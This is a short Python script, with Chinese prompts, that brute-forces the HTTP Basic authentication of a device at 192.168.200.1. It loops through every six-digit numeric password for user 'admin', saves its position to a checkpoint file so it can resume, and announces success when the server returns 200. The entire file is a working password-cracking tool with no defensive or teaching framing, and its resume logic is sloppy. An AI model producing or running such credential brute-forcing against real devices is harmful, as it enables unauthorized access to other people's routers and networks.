import requests
from bs4 import BeautifulSoup
import lxml
import base64
import os
import threading

def main(start):
    headers={'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language': 'zh-Hans-CN,zh-Hans;q=0.5',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
         'Accept-Encoding': 'gzip, deflate',
         'Proxy-Connection': 'Keep-Alive',
         'Host': '192.168.200.1',
         'Cookie': 'id=',
         'Authorization': 'Basic YWRtaW46MTIzNDU2'}
    username='admin'
    
    for i in range(start,1000000):
        if len(str(i)) < 6:
            i='0'*(6-len(str(i))) + str(i)
        pas=username+':'+str(i)
        print(pas,end='')
        pas=base64.b64encode(pas.encode('utf-8')).decode('utf-8')
        print('  '+pas)
        pas='Basic '+pas
        headers['Authorization']=pas
        host='http://192.168.200.1'
        with open('passwd.txt','w') as f:
            f.write(str(i))
        res=requests.get(host,headers=headers)
        #print(res.text)
        soup=BeautifulSoup(res.text,'lxml')
        if res.status_code == 200:
            break
    print('破解成功！密码%d' % i)

if not os.path.exists('passwd.txt'):
    	f=open('passwd.txt','w')
    	f.write('100000')
    	f.close()
with open('passwd.txt','r') as f:
    start=f.read()
    print(start)
    if start!='100000':
        a=input('是否从断点继续？:  ')
        if a=='y'or a=='Y':
            if int(start)<1000000:
                print('g')
                main(int(start))
        else:
            main(100000)
    


main(100000)
